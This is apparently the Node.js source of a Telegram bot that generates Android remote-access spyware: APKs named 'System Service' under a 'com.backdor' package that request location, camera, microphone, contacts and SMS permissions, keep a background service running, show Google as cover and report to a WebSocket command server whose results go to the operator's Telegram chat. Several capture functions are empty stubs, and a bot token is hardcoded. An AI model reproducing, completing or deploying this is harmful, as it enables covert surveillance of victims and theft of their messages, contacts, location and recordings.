const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const WebSocket = require('ws');

// Replace with your Telegram Bot Token
const token = '7806530872:AAGmc_18tJESXUpby0ehHK5f0rNDBvm9ytE';
const bot = new TelegramBot(token, { polling: true });

// WebSocket server for APK communication
const wss = new WebSocket.Server({ port: 8080 });
const connectedDevices = new Map();

wss.on('connection', (ws) => {
  ws.on('message', (message) => {
    try {
      const data = JSON.parse(message);
      if (data.type === 'register' && data.chatId) {
        connectedDevices.set(data.chatId, ws);
        const deviceInfo = data.deviceInfo || {};
        const reply = `✅ Device connected!\n\n` +
          `📅 Date: ${new Date().toLocaleString()}\n` +
          `📱 Model: ${deviceInfo.model || 'Unknown'}\n` +
          `🆔 Android ID: ${deviceInfo.androidId || 'Unknown'}\n` +
          `🔋 Battery: ${deviceInfo.battery || 'Unknown'}\n` +
          `🌐 IP: ${deviceInfo.ip || 'Unknown'}`;
        
        bot.sendMessage(data.chatId, reply, {
          reply_markup: {
            inline_keyboard: [
              [{ text: '📍 Get Location', callback_data: 'get_location' }],
              [{ text: '📸 Get Front Camera', callback_data: 'get_camera' }],
              [{ text: '🎤 Record Audio (15s)', callback_data: 'get_mic' }],
              [{ text: '📞 Get Contacts', callback_data: 'get_contact' }],
              [{ text: '📩 Get SMS', callback_data: 'get_sms' }],
              [{ text: '📱 Get Device Info', callback_data: 'get_device' }]
            ]
          }
        });
      } else if (data.chatId && connectedDevices.has(data.chatId)) {
        // Handle responses from the device
        if (data.type === 'location') {
          bot.sendMessage(data.chatId, `📍 Location: https://maps.google.com/?q=${data.lat},${data.lon}`);
        } else if (data.type === 'photo') {
          bot.sendPhoto(data.chatId, data.photo);
        } else if (data.type === 'audio') {
          bot.sendAudio(data.chatId, data.audio);
        } else if (data.type === 'contacts') {
          bot.sendMessage(data.chatId, `📞 Contacts:\n${JSON.stringify(data.contacts, null, 2)}`);
        } else if (data.type === 'sms') {
          bot.sendMessage(data.chatId, `📩 SMS:\n${JSON.stringify(data.sms, null, 2)}`);
        } else if (data.type === 'device_info') {
          bot.sendMessage(data.chatId, `📱 Device Info:\n${JSON.stringify(data.info, null, 2)}`);
        }
      }
    } catch (e) {
      console.error('WebSocket error:', e);
    }
  });

  ws.on('close', () => {
    for (const [chatId, connection] of connectedDevices.entries()) {
      if (connection === ws) {
        connectedDevices.delete(chatId);
        bot.sendMessage(chatId, '❌ Device disconnected');
        break;
      }
    }
  });
});

// Handle /start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Welcome to Remote Control Bot!', {
    reply_markup: {
      keyboard: [[{ text: 'Templates' }]],
      resize_keyboard: true,
      one_time_keyboard: true
    }
  });
});

// Handle "Templates" button
bot.on('message', (msg) => {
  if (msg.text === 'Templates') {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 'Building your APK... Please wait.');
    
    try {
      // Generate a unique package name
      const packageName = `com.backdor.${Math.random().toString(36).substring(2, 10)}`;
      
      // Create temp directory
      const tempDir = path.join(__dirname, 'temp', chatId.toString());
      if (!fs.existsSync(tempDir)) {
        fs.mkdirSync(tempDir, { recursive: true });
      }
      
      // Generate Kotlin project files
      generateKotlinProject(tempDir, packageName, chatId);
      
      // Build APK
      const apkPath = path.join(tempDir, 'app', 'build', 'outputs', 'apk', 'debug', 'app-debug.apk');
      
      // Run gradle build
      execSync(`cd ${path.join(tempDir)} && ./gradlew assembleDebug`, { stdio: 'inherit' });
      
      // Send APK to user
      if (fs.existsSync(apkPath)) {
        bot.sendDocument(chatId, apkPath, { caption: 'Success' }).then(() => {
          // Clean up
          fs.rmSync(tempDir, { recursive: true, force: true });
        });
      } else {
        bot.sendMessage(chatId, 'Failed to build APK');
      }
    } catch (error) {
      console.error(error);
      bot.sendMessage(chatId, 'Error building APK: ' + error.message);
    }
  }
});

// Handle inline button callbacks
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const command = query.data;
  
  if (connectedDevices.has(chatId)) {
    const ws = connectedDevices.get(chatId);
    ws.send(JSON.stringify({ command }));
    bot.answerCallbackQuery(query.id, { text: `Command ${command} sent!` });
  } else {
    bot.answerCallbackQuery(query.id, { text: 'No device connected!', show_alert: true });
  }
});

// Function to generate Kotlin project
function generateKotlinProject(dir, packageName, chatId) {
  // Create project structure
  fs.mkdirSync(path.join(dir, 'app', 'src', 'main', 'java', ...packageName.split('.')), { recursive: true });
  fs.mkdirSync(path.join(dir, 'app', 'src', 'main', 'res'), { recursive: true });
  
  // Generate build.gradle (Project)
  fs.writeFileSync(path.join(dir, 'build.gradle'), `
buildscript {
    ext.kotlin_version = '1.4.32'
    repositories {
        google()
        jcenter()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:4.1.3'
        classpath "org.jetbrains.kotlin:kotlin-gradle-plugin:\$kotlin_version"
    }
}

allprojects {
    repositories {
        google()
        jcenter()
    }
}

task clean(type: Delete) {
    delete rootProject.buildDir
}
  `);
  
  // Generate build.gradle (Module)
  fs.writeFileSync(path.join(dir, 'app', 'build.gradle'), `
apply plugin: 'com.android.application'
apply plugin: 'kotlin-android'
apply plugin: 'kotlin-android-extensions'

android {
    compileSdkVersion 30
    buildToolsVersion "30.0.3"

    defaultConfig {
        applicationId "${packageName}"
        minSdkVersion 21
        targetSdkVersion 30
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled false
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }
    kotlinOptions {
        jvmTarget = '1.8'
    }
}

dependencies {
    implementation "org.jetbrains.kotlin:kotlin-stdlib:\$kotlin_version"
    implementation 'androidx.core:core-ktx:1.3.2'
    implementation 'androidx.appcompat:appcompat:1.2.0'
    implementation 'com.google.android.material:material:1.3.0'
    implementation 'androidx.constraintlayout:constraintlayout:2.0.4'
    implementation 'org.java-websocket:Java-WebSocket:1.5.2'
    implementation 'com.google.code.gson:gson:2.8.6'
}
  `);
  
  // Generate AndroidManifest.xml
  fs.writeFileSync(path.join(dir, 'app', 'src', 'main', 'AndroidManifest.xml'), `
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="${packageName}">

    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.READ_PHONE_STATE" />

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="System Service"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.MaterialComponents.DayNight.DarkActionBar">
        
        <activity android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service
            android:name=".BackgroundService"
            android:enabled="true"
            android:exported="true" />
    </application>
</manifest>
  `);
  
  // Generate MainActivity.kt
  fs.writeFileSync(path.join(dir, 'app', 'src', 'main', 'java', ...packageName.split('.'), 'MainActivity.kt'), `
package ${packageName}

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.webkit.WebView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import org.java_websocket.client.WebSocketClient
import org.java_websocket.handshake.ServerHandshake
import java.net.URI
import java.util.*

class MainActivity : AppCompatActivity() {
    private val PERMISSIONS = arrayOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE
    )
    
    private val REQUEST_CODE = 123
    private var webSocketClient: WebSocketClient? = null
    private val chatId = "${chatId}"
    private val wsServer = "ws://YOUR_SERVER_IP:8080" // Replace with your server IP
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Check and request permissions
        if (!hasPermissions()) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, REQUEST_CODE)
        } else {
            startBackgroundService()
            connectWebSocket()
            showWebView()
        }
    }
    
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_CODE) {
            if (hasPermissions()) {
                startBackgroundService()
                connectWebSocket()
                showWebView()
            } else {
                Toast.makeText(this, "Permissions required!", Toast.LENGTH_LONG).show()
                finish()
            }
        }
    }
    
    private fun hasPermissions(): Boolean {
        for (permission in PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false
            }
        }
        return true
    }
    
    private fun startBackgroundService() {
        val serviceIntent = Intent(this, BackgroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }
    
    private fun connectWebSocket() {
        val uri = URI.create(wsServer)
        webSocketClient = object : WebSocketClient(uri) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                // Send device info when connected
                val deviceInfo = HashMap<String, String>().apply {
                    put("type", "register")
                    put("chatId", chatId)
                    put("deviceInfo", getDeviceInfo())
                }
                send(deviceInfo.toString())
            }
            
            override fun onMessage(message: String?) {
                message?.let { handleCommand(it) }
            }
            
            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                // Try to reconnect
                connectWebSocket()
            }
            
            override fun onError(ex: Exception?) {
                ex?.printStackTrace()
            }
        }
        webSocketClient?.connect()
    }
    
    private fun handleCommand(command: String) {
        when (command) {
            "get_location" -> sendLocation()
            "get_camera" -> sendCameraPhoto()
            "get_mic" -> recordAudio()
            "get_contact" -> sendContacts()
            "get_sms" -> sendSMS()
            "get_device" -> sendDeviceInfo()
        }
    }
    
    private fun showWebView() {
        val webView = WebView(this)
        webView.settings.javaScriptEnabled = true
        webView.loadUrl("https://google.com")
        setContentView(webView)
    }
    
    private fun getDeviceInfo(): String {
        return "{\"model\": \"${Build.MODEL}\", " +
               "\"androidId\": \"${Build.SERIAL}\", " +
               "\"battery\": \"Unknown\", " +
               "\"ip\": \"Unknown\"}"
    }
    
    private fun sendLocation() {
        // Implement location sending
    }
    
    private fun sendCameraPhoto() {
        // Implement camera photo capture
    }
    
    private fun recordAudio() {
        // Implement audio recording
    }
    
    private fun sendContacts() {
        // Implement contacts retrieval
    }
    
    private fun sendSMS() {
        // Implement SMS retrieval
    }
    
    private fun sendDeviceInfo() {
        // Implement detailed device info
    }
}
  `);
  
  // Generate BackgroundService.kt
  fs.writeFileSync(path.join(dir, 'app', 'src', 'main', 'java', ...packageName.split('.'), 'BackgroundService.kt'), `
package ${packageName}

import android.app.Service
import android.content.Intent
import android.os.IBinder
import org.java_websocket.client.WebSocketClient
import java.net.URI

class BackgroundService : Service() {
    private var webSocketClient: WebSocketClient? = null
    private val chatId = "${chatId}"
    private val wsServer = "ws://YOUR_SERVER_IP:8080" // Replace with your server IP

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        connectWebSocket()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    private fun connectWebSocket() {
        val uri = URI.create(wsServer)
        webSocketClient = object : WebSocketClient(uri) {
            override fun onOpen(handshakedata: ServerHandshake?) {
                // Send registration message
                val message = "{\"type\":\"register\",\"chatId\":\"$chatId\"}"
                send(message)
            }

            override fun onMessage(message: String?) {
                // Handle incoming messages
            }

            override fun onClose(code: Int, reason: String?, remote: Boolean) {
                // Try to reconnect
                connectWebSocket()
            }

            override fun onError(ex: Exception?) {
                ex?.printStackTrace()
            }
        }
        webSocketClient?.connect()
    }

    override fun onDestroy() {
        webSocketClient?.close()
        super.onDestroy()
    }
}
  `);
  
  // Generate gradle wrapper files
  fs.mkdirSync(path.join(dir, 'gradle', 'wrapper'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'gradle', 'wrapper', 'gradle-wrapper.properties'), `
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-6.5-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
  `);
  
  // Generate settings.gradle
  fs.writeFileSync(path.join(dir, 'settings.gradle'), `
include ':app'
  `);
  
  // Generate gradlew and gradlew.bat (simplified - in real project you'd copy actual files)
  fs.writeFileSync(path.join(dir, 'gradlew'), '#!/bin/sh\n\necho "Gradle wrapper"');
  fs.writeFileSync(path.join(dir, 'gradlew.bat'), '@echo off\n\necho "Gradle wrapper"');
  fs.chmodSync(path.join(dir, 'gradlew'), 0o755);
}

console.log('Bot started and WebSocket server running on port 8080');
